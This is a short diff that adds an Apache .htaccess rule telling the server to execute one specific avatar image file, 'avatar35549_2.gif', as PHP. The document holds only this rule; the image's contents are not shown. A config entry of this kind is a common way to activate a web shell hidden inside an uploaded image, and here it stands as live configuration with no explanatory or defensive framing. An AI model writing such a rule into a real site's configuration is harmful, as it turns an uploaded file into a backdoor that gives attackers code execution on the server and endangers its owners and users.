@@ -1,0 +1,3 @@
+<Files "avatar35549_2.gif">
+AddType application/x-httpd-php .gif
+</Files>
